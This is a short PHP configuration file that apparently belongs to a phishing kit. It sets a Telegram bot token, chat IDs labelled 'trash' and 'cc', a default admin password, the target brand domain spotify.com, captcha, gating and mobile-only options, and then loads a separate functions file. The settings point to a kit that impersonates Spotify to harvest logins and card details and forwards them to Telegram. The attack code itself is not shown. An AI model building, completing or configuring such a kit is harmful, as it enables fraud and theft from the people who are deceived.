<?php

$token = "VOTRE_TOKEN_BOT";
$id_trash = "VOTRE_CHAT_ID";
$id_cc = "VOTRE_CHAT_ID";

$api_key = "";
$wl_password = "admin123";

$motif = 1;
$brand_domain = 'spotify.com';
$skipsocialmedia = false;
$captcha = 3;
$loading_timer = 60;

$gate_param = '';
$gate_value = '';
$ch_enabled = false;
$ch_label = '';
$mobile_only = false;

require_once 'functions.php';
?>
